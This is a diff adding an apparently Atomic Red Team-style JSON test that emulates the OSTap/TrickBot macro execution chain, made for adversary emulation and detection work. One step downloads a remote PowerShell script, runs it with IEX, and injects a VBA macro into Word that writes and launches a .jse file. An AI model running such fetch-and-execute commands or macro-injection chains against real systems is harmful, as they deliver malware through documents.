@@ -1,0 +1,111 @@
+{
+  "id": "8bebc690-18c7-4549-bc98-210f7019efff",
+  "name": "OSTap Style Macro Execution",
+  "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "f66e5b5f-796c-4336-acee-95ea106ac495",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5c1f714a-0b54-488a-9c0f-8ec26395dadb",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item #{jse_path} -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ea50329c-a9ee-4777-8ff1-e2166444001d",
+      "name": "Check dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c5f4b1e2-8b4d-45db-a0ce-36e406696f03",
+      "name": "Resolve dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ee67f9ce-8fb4-45a7-a687-005d2dcd919b",
+      "name": "Re-check dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "f66e5b5f-796c-4336-acee-95ea106ac495",
+      "p": "on-success",
+      "o": "5c1f714a-0b54-488a-9c0f-8ec26395dadb"
+    },
+    {
+      "s": "f66e5b5f-796c-4336-acee-95ea106ac495",
+      "p": "on-failure",
+      "o": "5c1f714a-0b54-488a-9c0f-8ec26395dadb"
+    },
+    {
+      "s": "ea50329c-a9ee-4777-8ff1-e2166444001d",
+      "p": "on-success",
+      "o": "f66e5b5f-796c-4336-acee-95ea106ac495"
+    },
+    {
+      "s": "ea50329c-a9ee-4777-8ff1-e2166444001d",
+      "p": "on-failure",
+      "o": "c5f4b1e2-8b4d-45db-a0ce-36e406696f03"
+    },
+    {
+      "s": "c5f4b1e2-8b4d-45db-a0ce-36e406696f03",
+      "p": "on-success",
+      "o": "ee67f9ce-8fb4-45a7-a687-005d2dcd919b"
+    },
+    {
+      "s": "ee67f9ce-8fb4-45a7-a687-005d2dcd919b",
+      "p": "on-failure",
+      "o": "f66e5b5f-796c-4336-acee-95ea106ac495"
+    }
+  ],
+  "tags": [
+    "T1204.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "jse_path",
+      "type": "string",
+      "description": "Path for the macro to write out the \"malicious\" .jse file\n",
+      "value": "C:\\Users\\Public\\art.jse"
+    },
+    {
+      "name": "ms_product",
+      "type": "string",
+      "description": "Maldoc application Word or Excel",
+      "value": "Word"
+    }
+  ]
+}
